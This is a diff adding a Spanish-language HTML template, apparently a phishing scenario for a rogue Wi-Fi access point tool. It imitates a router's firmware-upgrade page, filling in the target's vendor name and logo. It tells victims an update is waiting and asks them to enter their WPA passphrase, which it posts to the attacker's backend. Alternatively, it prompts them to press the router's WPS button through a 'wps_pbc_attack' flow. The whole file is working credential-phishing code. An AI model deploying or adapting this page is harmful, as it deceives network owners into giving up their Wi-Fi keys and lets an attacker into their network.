@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Router Configuration Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/static/bootstrap.min.css">
+  <link rel="stylesheet" href="/static/font-awesome-4.7.0/css/font-awesome.min.css">
+  <script src="/static/jquery.min.js"></script>
+  <script src="/static/bootstrap.min.js"></script>
+
+  <!-- CSS -->
+  <style type="text/css">
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+    img {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+    }
+    .isa_info {
+        color: #9F6000;
+        background-color: #FEEFB3
+    }
+    .isa_info i {
+        margin:1px 3px;
+        font-size:18px;
+        vertical-align:middle;
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Setup Básico</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">Clonado MAC</a></li>
+              <li><a href="#">Routing avanzado</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Ajustes inalámbricos básicos</a></li>
+              <li><a href="#">Seguridad inalámbrica</a></li>
+              <li><a href="#">Filtro MAC</a></li>
+              <li><a href="#">Ajustes inalámbricos avanzados</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Firewall</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Restricción de acceso <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Acceso a Internet</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Administración <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Administración</a></li>
+              <li><a href="#">Log</a></li>
+              <li><a href="#">Diagnóstico</a></li>
+              <li><a href="#">Configuración de fábrica</a></li>
+              <li><a href="#">Administración de configuración</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Estado <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Router</a></li>
+              <li><a href="#">Red local</a></li>
+              <li><a href="#">Wi-Fi</a></li>
+              <li><a href="#">Routing avanzado</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
+
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       <center><img id="ap_logo_path" src="/static/{{ target_ap_logo_path }}"></img></center>
+       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
+    	 <p class="lead">Una nueva versión del {{ target_ap_vendor }} firmware ({{ firmware_version }}) ha sido detectada y espera instalación. Revise los siguientes términos y condiciones y continúe.</p>
+     </div>
+    <form>
+      <div class="form-group">
+        <label for="comment">Terms And Conditions:</label>
+        <textarea readonly class="form-control" rows="5" id="comment">
+          1. LICENCIA.
+
+          Sujeto a los términos y condiciones de este Acuerdo de licencia de software, {{target_ap_vendor}} por la presente le otorga una licencia restringida, limitada, no exclusiva e intransferible para usar el firmware / software / controladores de {{target_ap_vendor}} solo en conjunto con productos de {{target_ap_vendor}}. La Compañía {{target_ap_vendor}} no le otorga ningún derecho de licencia sobre ninguna patente, derechos de autor u otros derechos de propiedad intelectual que sean propiedad de o licenciados.
+          
+          2. SIN GARANTÍA.
+          
+          El firmware / software / controladores de {{target_ap_vendor}} se proporcionan "TAL CUAL" sin garantía de ningún tipo. {{target_ap_vendor}} La empresa no garantiza que las funciones contenidas en el firmware / software / controladores de {{target_ap_vendor}} cumplirán con sus requisitos o que el funcionamiento del firmware / software / controladores de {{target_ap_vendor}} será ininterrumpido o con errores -gratis. {{target_ap_vendor}} Por la presente, la empresa renuncia a todas las garantías, expresas o implícitas, con respecto al firmware / software / controladores de {{target_ap_vendor}}, incluidas, entre otras, cualquier garantía implícita de comerciabilidad, idoneidad para un propósito particular o no infracción .
+          
+          3. SIN RESPONSABILIDAD.
+          
+          En ningún caso {{target_ap_vendor}} o cualquier otra parte que haya estado involucrada en la creación, producción o entrega del firmware / software / controladores de {{target_ap_vendor}} será responsable de cualquier daño que surja o esté relacionado con este Acuerdo de licencia de software o el firmware / software / controladores de {{target_ap_vendor}}, incluidos, entre otros, daños o pérdidas directos, indirectos, consecuentes, incidentales o especiales, incluidos, entre otros, daños por lucro cesante o pérdidas resultantes de la interrupción del negocio o pérdida de datos, independientemente de la forma de acción o teoría legal bajo la cual se pueda afirmar la responsabilidad, incluso si se advierte de la posibilidad o probabilidad de tales daños.
+
+       </textarea>
+        <div class="checkbox">
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">Estoy de acuerdo con los términos y condiciones anteriores</label>
+        </div>
+      </div>
+      <div class="form-group-has-feedback" id="psk_field">
+          <label for="pwd">{{ target_ap_encryption }} {{ password_name }}:</label>
+          <input class="form-control" type="password" id="pwd" disabled>
+      </div>
+      <div class="container text-center">
+        <script>
+            if ( "1" == {{ wps_pbc_attack }} && "1" == {{ psk_enable }}) {
+                document.write("<p align=\"left\"> Alternativamente, vaya al enrutador inalámbrico y presione el botón WPS durante un par de segundos para inicializar el proceso de actualización del firmware.</p>")
+            } else if ( "1" == {{wps_pbc_attack}}) {
+                document.write("<p align=\"left\"> Vaya al enrutador inalámbrico y presione el botón WPS durante un par de segundos para inicializar el proceso de actualización del firmware.</p>")
+            }
+        </script>
+        <div class="isa_info" id="pw_status" align="left">
+        </div>
+        <button class="btn btn-primary" id="btn">Iniciar descarga</button>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
+
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">© {{ target_ap_vendor }} 2019. Todos los derechos reservados.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
+
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="Cerrar" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Información</h4>
+        </div>
+        <div class="modal-body">
+          <p>Se requiere actualización.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="Cerrar" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Información</h4>
+        </div>
+        <div class="modal-body">
+          <p>Introduzca una contraseña válida.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="Cerrar" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Información</h4>
+        </div>
+        <div class="modal-body">
+          <p>Acepte los Términos y condiciones para continuar.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+<script>
+/* If we don't have the logo just not display the image */
+var match = /^http:.*static\/$/.exec(document.getElementById("ap_logo_path").src);
+if (match) {
+    document.getElementById('ap_logo_path').style.display = 'none';
+}
+
+/* initialize the status description based on wps_pbc_attack and psk_enable flags */
+var pw_status_element = document.getElementById('pw_status');
+if ("0" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    /* hide the pre-shared key region if psk_enable is 0 in the config.ini */
+    document.getElementById('psk_field').style.display = 'none';
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Esperando que el usuario presione el botón WPS para inicializar la actualización del firmware.";
+} else if ("1" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Esperando que el usuario presione el botón WPS o ingrese la {{password_name}} para inicializar la actualización del firmware.";
+}
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+    e.preventDefault();
+
+    // get the password box and checkbox elements
+  	var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+  	if ( box.checked == true )
+  		{
+        // check if the psk not entered and wps_pbc_attack is enabled
+        if (input.value == "" && "1" == {{wps_pbc_attack}})
+        {
+            // pass to wps state handler
+            var data =
+            {
+                "get_wps_state_handler": input.value
+            };
+            var dataToSend = JSON.stringify(data);
+            // post the data
+            $.ajax(
+                {
+                    url: '/backend/',
+                    type: 'POST',
+                    data: dataToSend,
+
+                    success: function (jsonResponse) {
+                        var objresponse = JSON.parse(jsonResponse);
+                        var verify_status = objresponse['get_wps_state_handler']
+                        if (verify_status == 'WPS_CONNECTING' || verify_status == "WPS_CONNECTED") {
+                            /* green for success */
+                            pw_status_element.style.color = "#4F8A10";
+                            pw_status_element.style.backgroundColor = "#DFF2BF";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-check\"></i>Descarga de firmware completa.!"
+                        } else if (verify_status == "WPS_IDLE") {
+                            /* red for error */
+                            pw_status_element.style.color = "#D8000C";
+                            pw_status_element.style.backgroundColor = "#FFD2D2";
+                            pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>Presione el botón WPS antes de iniciar la actualización del firmware!"
+                        }
+                    },
+                });
+        }
+        // preshared-key is not filled
+        else if ( input.value == "" ) {
+            $("#empty-pass").modal("show");
+        }
+        else
+      		{
+                var data =
+                {
+                    "psk_verify": input.value
+                };
+                var dataToSend = JSON.stringify(data);
+                // post the data
+                $.ajax(
+                    {
+                        url: '/backend/',
+                        type: 'POST',
+                        data: dataToSend,
+
+                        success: function (jsonResponse) {
+                            var objresponse = JSON.parse(jsonResponse);
+                            var verify_status = objresponse['psk_verify']
+                            if (verify_status == 'success') {
+                                document.getElementById("pw_status").innerHTML = ""
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
+                            } else if (verify_status == 'fail') {
+                                pw_status_element.style.color = "#D8000C";
+                                pw_status_element.style.backgroundColor = "#FFD2D2";
+                                pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>El {{password_name}} proporcionado no es válido!"
+                            } else {
+                                /* we may not define the extensions and in that case
+                                   just post the passphrase */
+                                post('upgrading.html', {"wfphshr-wpa-password": input.value});
+                            }
+                        },
+                    });
+      		    }
+      }
+    else
+      {
+        // display no checkbox message
+        $("#no-checkbox").modal("show");
+      }
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+
+  // if the box is checked
+	if ( box.checked == true )
+		{
+      // enabale the password box
+			input.disabled = false;
+		}
+	else
+		{
+      // disable the password box
+			input.disabled = true;
+		}
+  }
+  
+// update copyright year
+var theDate=new Date(); 
+document.getElementsByClassName("text-muted")[0].innerHTML = "© {{ target_ap_vendor }} " + theDate.getFullYear() + ". Todos los derechos reservados.";
+
+</script>
+</body>
+</html>
